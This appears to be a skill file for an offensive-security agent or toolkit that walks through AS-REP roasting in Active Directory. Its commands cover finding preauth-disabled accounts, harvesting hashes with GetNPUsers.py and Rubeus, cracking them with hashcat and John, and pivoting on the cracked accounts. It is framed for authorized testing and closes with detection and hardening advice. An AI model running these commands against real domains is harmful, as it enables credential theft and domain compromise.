---
name: asreproasting
description: Use when testing Active Directory for AS-REP roasting on an
  authorized engagement. Covers finding accounts with Kerberos
  preauthentication disabled, requesting crackable AS-REP responses with
  GetNPUsers.py from impacket 0.12.0 and Rubeus 2.x, and offline cracking of
  krbasrep5 hashes with hashcat 6.2.6 mode 18200 or John the Ripper
  1.9.0-jumbo-1. Use when you have usernames but no credentials, when
  NetExec or BloodHound flags accounts with preauth disabled, or when you
  need low noise credential recovery during an internal test or CTF.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [ad-enumeration, password-attacks]
tools:
  - name: impacket
    version: 0.12.0
  - name: Rubeus
    version: 2.x
  - name: hashcat
    version: 6.2.6
  - name: NetExec
    version: 1.4.0
  - name: John the Ripper
    version: 1.9.0-jumbo
---

AS-REP roasting abuses accounts that have Kerberos preauthentication
disabled. Normally a client must prove it knows the password before the
domain controller answers an authentication request. When the
DONT_REQUIRE_PREAUTH flag is set on an account, anyone can ask the KDC for
an AS-REP message for that account, and part of that reply is encrypted
with the account's password hash. The reply can be cracked offline, so a
weak password on one of these accounts becomes a set of working domain
credentials. This skill covers the full authorized workflow for Active
Directory assessments, lab environments, and CTFs only: finding the
vulnerable accounts, requesting the AS-REP data with and without
credentials, cracking it offline, and using the recovered passwords.

## Quick Workflow

1. Build or obtain a list of domain usernames from enumeration, OSINT, or
   the ad-enumeration skill.
2. Find accounts with preauthentication disabled using LDAP filters,
   PowerView, or NetExec.
3. Request AS-REP responses for those accounts with GetNPUsers.py (no
   credentials needed) or Rubeus (from a Windows host).
4. Save the responses in hashcat format and move them to the cracking box.
5. Crack with hashcat mode 18200, starting with rockyou and rules, then
   targeted masks.
6. Validate each cracked password immediately against SMB or LDAP, one at
   a time, watching the lockout policy.
7. Check the new accounts for group membership, SPNs, and delegation to
   plan the next step.
8. Record the account, hash type, crack time, and password strength for the
   report.

## 1. Find accounts with preauthentication disabled

The flag is bit 0x400000 (4194304) in the userAccountControl attribute.
Querying for it needs either valid credentials or, in some setups, no
credentials at all.

```bash
# LDAP search for accounts with DONT_REQUIRE_PREAUTH set
ldapsearch -x -H ldap://10.10.10.10 -D 'svcuser@corp.local' -w 'Password1' \
  -b 'DC=corp,DC=local' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName userPrincipalName userAccountControl
```

```bash
# NetExec checks the flag while enumerating users
nxc ldap 10.10.10.10 -u svcuser -p 'Password1' --users | grep -i preauth
```

On a Windows host with PowerView loaded, the dedicated switch does the
same job:

```powershell
# List every account that does not require preauthentication
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname
```

If you have no credentials yet, skip this phase. GetNPUsers.py can test
candidate usernames directly, so a username list is enough to start.

## 2. Request AS-REP responses

GetNPUsers.py sends the preauthentication-less AS request and saves the
reply in a crackable format. It works without any credentials when you
supply a username list.

```bash
# No credentials: try every name in users.txt, save hashcat format hashes
GetNPUsers.py -dc-ip 10.10.10.10 corp.local/ -usersfile users.txt \
  -no-pass -format hashcat -outputfile asrep.hashes

# With credentials: request AS-REP data for ALL users at once
GetNPUsers.py -dc-ip 10.10.10.10 corp.local/svcuser:Password1 \
  -request -format hashcat -outputfile asrep.hashes

# John the Ripper format instead of hashcat format
GetNPUsers.py -dc-ip 10.10.10.10 corp.local/ -usersfile users.txt \
  -no-pass -format john -outputfile asrep.john
```

NetExec can do the same over LDAP when you hold credentials:

```bash
# Dump AS-REP roastable hashes for every vulnerable account
nxc ldap 10.10.10.10 -u svcuser -p 'Password1' --asreproast asrep.hashes
```

From a Windows host, Rubeus performs the same request without Python:

```powershell
# Harvest AS-REP responses for all users with preauth disabled
Rubeus.exe asreproast /nowrap /format:hashcat /outfile:C:\temp\asrep.hashes
```

A line in the output file that starts with `$krb5asrep$23$` (hashcat) or
`$krb5asrep$` (john) is a successful capture. Accounts that fail return a
KDC error instead, which tells you the flag was not really set.

## 3. Crack the hashes offline

Move the hash file to the cracking box. Nothing after this point touches
the domain, so you can crack as aggressively as your hardware allows.

```bash
# hashcat mode 18200: Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force

# Add rules after the straight dictionary run
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# Targeted mask attack for common corporate patterns (SeasonYear, etc.)
hashcat -m 18200 asrep.hashes -a 3 '?u?l?l?l?l?l202?d' --force
```

```bash
# John the Ripper alternative
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.john
john --show --format=krb5asrep asrep.john
```

Crack results print as `username:password`. AS-REP hashes are salted with
the username, so each account needs its own cracking run, but one good
wordlist usually covers all of them in a single hashcat session.

## 4. Validate and use the cracked credentials

Test each recovered password carefully. Authentication attempts can lock
accounts, so check the lockout threshold from the domain policy first and
test one account at a time.

```bash
# Test one credential pair against SMB (shows [+] on success)
nxc smb 10.10.10.10 -u crackeduser -p 'CrackedPass1'

# Confirm the same pair against LDAP too
nxc ldap 10.10.10.10 -u crackeduser -p 'CrackedPass1'
```

```bash
# Quick credential check without a full module run
crackmapexec-legacy 2>/dev/null; nxc smb 10.10.10.10 \
  -u crackeduser -p 'CrackedPass1' --local-auth 2>&1 | head -3
```

Once a password works, immediately enumerate what the account can do:

```bash
# Groups, SPNs, and delegation flags for the new account
nxc ldap 10.10.10.10 -u crackeduser -p 'CrackedPass1' --users | grep -i crackeduser
GetUserSPNs.py -dc-ip 10.10.10.10 corp.local/crackeduser:'CrackedPass1'
```

## 5. Turn the foothold into an attack path

A cracked AS-REP account is often a low privilege user, but it still
unlocks the rest of the methodology. Feed the account into BloodHound
collection to see its paths to Domain Admins, check whether it is itself
Kerberoastable, and look at its group memberships for delegation or
admin rights on other machines. If the account has an SPN, Kerberoast it
next. If it has interesting ACLs, the bloodhound-methodology skill shows
how to turn edges like GenericAll or ForceChangePassword into action.

## Edge cases

- GetNPUsers.py with `-no-pass` returns KDC_ERR_C_PRINCIPAL_UNKNOWN for
  names that do not exist. Those are failed guesses, not vulnerable
  accounts. Only `$krb5asrep$` lines count.
- An account flagged by LDAP but failing the AS request usually has the
  flag set on a stale or disabled object, or the domain requires preauth
  through policy anyway. Move on to the next name.
- Clock skew breaks Kerberos requests. If every request fails with
  KRB_AP_ERR_SKEW, sync the attacking box clock with the DC using ntpdate
  or chrony before retrying.
- IPv6 or DNS issues make the KDC unreachable by name. Always pass the DC
  by IP with `-dc-ip` and add a hosts entry for the domain if needed.
- Rubeus needs the `/nowrap` flag, otherwise the hash wraps across lines
  and hashcat rejects it.
- hashcat reports "no hashes loaded" when the file has john format hashes.
  Match the format to the tool: `-m 18200` needs `$krb5asrep$23$` lines.
- Usernames with special characters (accents, spaces) can break
  GetNPUsers.py parsing. Quote them in the users file and fall back to
  requesting with credentials and `-request` instead.
- Some environments rate limit AS requests. Space requests out and prefer
  the single `-request` run with credentials over thousands of individual
  no-auth requests.

## Escalation

- No credentials and no username list: harvest usernames first with
  kerbrute user enumeration or the ad-enumeration skill, then feed the
  list to GetNPUsers.py.
- GetNPUsers.py fails over UDP: force TCP with the `-tcp` flag if the
  version supports it, or tunnel through proxychains.
- Cracking stalls on every hash: prioritize. Accounts whose descriptions
  mention admin, backup, or service roles are worth mask attacks with
  company specific patterns (company name, seasons, years).
- Password recovered but account is disabled: check whether the hash
  belongs to a different enabled account with the same password, which
  happens when passwords are reused.
- Domain functional level blocks the attack entirely: fall back to
  password spraying with the username list (password-attacks skill),
  respecting the lockout policy.
- You cracked a password but the account has no useful rights: use it as
  the credential for BloodHound collection, since any authenticated user
  can collect the domain graph.

## Detection and defender view

Defenders see AS-REP roasting as a burst of Event ID 4768 (Kerberos
authentication service request) from a single source, where the requests
carry no preauthentication data and many target accounts that do not
normally log on from that host. Honeypot accounts with preauthentication
disabled catch this reliably, because no legitimate process should ever
request AS-REP data for them. The durable fixes are: enable Kerberos
preauthentication on every account (clear the DONT_REQUIRE_PREAUTH flag),
set long random passwords on any account that must keep the flag for
legacy reasons, and alert on 4768 events without preauthentication from
unexpected sources. Removing the flag is a one line change and breaks
nothing modern.

## Key references

- MITRE ATT&CK T1558.004 (Steal or Forge Kerberos Tickets: AS-REP
  Roasting).
- Impacket GetNPUsers.py documentation:
  https://github.com/fortra/impacket/tree/master/examples
- hashcat mode 18200 (Kerberos 5 AS-REP etype 23):
  https://hashcat.net/wiki/doku.php?id=example_hashes
- Rubeus documentation:
  https://github.com/GhostPack/Rubeus
- Microsoft documentation on Kerberos preauthentication and
  userAccountControl flags.
